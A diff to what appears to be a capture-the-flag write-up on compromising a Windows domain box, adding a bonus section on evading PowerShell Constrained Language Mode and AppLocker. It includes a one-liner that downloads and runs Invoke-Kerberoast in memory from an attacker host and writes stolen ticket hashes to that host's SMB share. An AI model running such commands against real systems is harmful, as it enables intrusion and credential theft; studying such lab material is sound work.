@@ -10,6 +10,8 @@
 - We bypass by moving it to the Windows `temp` folder and are faced with another error requiring us to authenticate to the network.
 - We add the `amanda`'s credentials as flags to the `Rubeus` tool and manage to kerberoast `mrkly`.
 - We crack his `TGS` hash and are able to get the password. We then proceed to `DCSync` and obtain the `NTLM hash` for the `administrator` account and `PTH` to gain complete access.
+- Bonus: Bypassing **PowerShell Contrained Language Mode**, dodging **Applocker**, **authenticating** to the network and **Kerberoasting** all in a **one-liner** and *without touching disk*.
+- Joke Section: Pwning the box with **ZeroLogon** XDD
 
 ---
 
@@ -322,3 +324,30 @@ Now we crack the hash for `mrkly` again with `john`:
 and follow up with `psexec.py` for a quick **Pass-The-Hash** attack to get code execution as `NT Authority\System`:
 
 ![got-system](got-system.jpg)
+
+### Bonus: PowerShell Contrained Language Mode, Bypassing it along with Applocker and Kerberoasting without touching disk. All in a PowerShell one-liner :D
+After I initially got the WinRM shell, It kept asking for my PEM pass phrase after each command.
+
+I wanted to get a `nishang` shell but couldn't do the `IEX` command (`Invoke-Expression`). This was because of **PowerShell's Contrained Language Mode**.
+
+![constrained-language-mode](constrained-language-mode.jpg)
+
+**Contrained Language Mode** disables a few PowerShell commands that can be dangerous.
+
+*Fortunately,* it can be bypassed by *downgrading* to PowerShell version 2.
+
+We're going to be abusing the `Start-Process` command to start a `powershell.exe` with `-v 2` and the command `-c IEX(New-Object Net.webClient).downloadString('http://10.10.16.7/Invoke-Kerberoast.ps1')` as arguments. This is to:
+
+1. Import the `Invoke-Kerberoast` code into memory
+2. Execute the command `Invoke-Kerberoast -OutputFormat john | % { $_.Hash } | Out-File -Encoding ASCII \\10.10.16.7\share\roasted.txt`
+3. Output the TGS hash of the `mrlky` user to our SMB share.
+
+we will use the `-Credential` paramer with `Start-Process` to create the needed Network Authentication for the attack to succeed.
+
+*That way,* we've hit multiple birds with one stone.
+1. Jumped over Applocker
+2. Dodged Contrained Language Mode
+3. Created the needed Network Logon
+4. And never touched the victim's disk in the process
+
+![bonus-kill](bonus-kill.jpg)
